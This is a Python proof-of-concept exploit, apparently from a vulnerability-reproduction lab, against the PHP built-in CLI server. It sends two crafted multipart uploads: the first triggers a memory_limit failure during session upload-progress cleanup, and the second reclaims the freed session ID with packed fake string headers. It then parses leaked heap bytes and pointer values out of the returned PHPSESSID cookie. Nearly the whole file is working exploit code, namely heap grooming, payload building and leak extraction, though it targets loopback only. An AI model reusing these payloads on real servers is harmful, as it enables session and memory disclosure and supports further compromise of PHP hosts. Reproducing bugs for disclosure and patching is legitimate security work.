#!/usr/bin/env python3
"""Loopback-only, two-request PHP CLI-server session-cookie disclosure lab.

The first request hits memory_limit during pre-RINIT upload-progress cleanup.
The second reclaims the stale session ID's zend_string header with a form value.
No request is sent to a remote host.
"""

from __future__ import annotations

import argparse
import http.client
import os
import socket
import struct
import subprocess
import tempfile
import time
import urllib.parse
from pathlib import Path

import repro


def producer() -> bytes:
    body = bytearray(repro.field(b"PHPSESSID", b"\x00"))
    for index in range(864):
        name = (f"files[R{index:05d}{'K' * 90}]" + "[a]" * 62).encode()
        ctype = b"C" * (103 if index == 0 else 231) if index < 2 else b"application/octet-stream"
        body += b"--" + repro.BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name
        body += b"\"; filename=\"" + (b"A" if index < 2 else b"") + b"\"\r\n"
        body += b"Content-Type: " + ctype + b"\r\n\r\n"
    for index in range(37):
        name = f"f{index:04d}".encode().ljust(103, b"x")
        body += repro.field(name, b"v" * 8)
    body += repro.field(b"PHP_SESSION_UPLOAD_PROGRESS", b"kk")
    for index in range(95):
        name = f"t{index:02d}".encode().ljust(35, b"t")
        body += repro.field(name, b"T" * 35)
    body += repro.field(b"nested_t000" + b"[a]" * 27, b"v")
    headers = b"".join(f"X-Fill-{index:04d}: ".encode() + b"H" * 2500 + b"\r\n"
                       for index in range(232))
    body += (b"--" + repro.BOUNDARY + b"\r\nContent-Disposition: form-data; "
             b"name=\"lastfile\"; filename=\"X\"\r\n"
             b"Content-Type: application/octet-stream\r\n" + headers + b"\r\n\r\n")
    body += b"--" + repro.BOUNDARY + b"--\r\n"
    return bytes(body)


def consumer(read_length: int) -> bytes:
    body = bytearray(repro.field(b"PHPSESSID", b"a"))
    body += repro.field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for index in range(570):
        if index == 527:
            for item in range(100):
                value = bytearray(f"V{item:04d}".encode().ljust(303, b"Y"))
                marker = f"LABID{item:04d}".encode().ljust(32, b"Q")
                value[232:256] = struct.pack("<QQQ", 0x1600000001, 0, read_length)
                value[256:288] = marker
                body += repro.field(f"s{item:04d}".encode(), bytes(value))
        name = (f"files[R{index:05d}{'K' * 90}]" + "[a]" * 62).encode()
        body += repro.field(name, b"v")
    body += b"--" + repro.BOUNDARY + b"--\r\n"
    return bytes(body)


def send(port: int, body: bytes) -> tuple[str, bytes]:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    try:
        connection.request("POST", "/index.php", body=body,
                           headers={"Content-Type": f"multipart/form-data; boundary={repro.BOUNDARY.decode()}"})
        response = connection.getresponse()
        cookie = response.getheader("Set-Cookie")
        response.read()
        encoded = cookie.partition("PHPSESSID=")[2].partition(";")[0] if cookie else ""
        return f"HTTP {response.status}", urllib.parse.unquote_to_bytes(encoded)
    finally:
        connection.close()


def run(binary: Path, read_length: int) -> None:
    first = producer()
    second = consumer(read_length)
    assert len(first) == 947_495, len(first)
    assert len(second) == 235_803, len(second)
    assert max(len(first), len(second)) < 1_048_576
    port = repro.free_port()
    docroot = Path(__file__).resolve().parent / "www"
    with tempfile.TemporaryFile() as log:
        process = subprocess.Popen([str(binary), "-n", "-d", "memory_limit=128M",
                                    "-d", "post_max_size=8M", "-d", "session.upload_progress.enabled=1",
                                    "-d", "display_errors=Off", "-S", f"127.0.0.1:{port}",
                                    "-t", str(docroot)], stdout=log, stderr=subprocess.STDOUT)
        try:
            for _ in range(50):
                if process.poll() is not None:
                    raise RuntimeError(f"server exited at startup: {process.returncode}")
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                        break
                except OSError:
                    time.sleep(0.1)
            else:
                raise RuntimeError("server did not start")
            first_status, _ = send(port, first)
            second_status, decoded = send(port, second)
            print(f"bodies: {len(first)} and {len(second)} bytes")
            print(f"first: {first_status}; second: {second_status}; worker_alive={process.poll() is None}")
            print(f"session cookie: {len(decoded)} decoded bytes; head={decoded[:32]!r}")
            if decoded.startswith(b"LABID0031"):
                beyond_value = decoded[47:]
                print(f"controlled stale ID: yes; bytes beyond form value: {len(beyond_value)}")
                pointers = [(offset, hex(struct.unpack_from("<Q", decoded, offset)[0]))
                            for offset in range(0, len(decoded) - 7, 8)
                            if 0x700000000000 <= struct.unpack_from("<Q", decoded, offset)[0]
                            < 0x800000000000]
                print(f"pointer-shaped words: {pointers[:12]}")
            else:
                print("controlled stale ID: no")
        finally:
            if process.poll() is None:
                process.terminate()
            process.wait()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--php", type=Path, required=True, help="locally built PHP CLI binary")
    parser.add_argument("--read-length", type=int, default=128, choices=(32, 128, 16_000))
    args = parser.parse_args()
    binary = args.php.resolve(strict=True)
    os.chdir(Path(__file__).resolve().parent)
    run(binary, args.read_length)


if __name__ == "__main__":
    main()
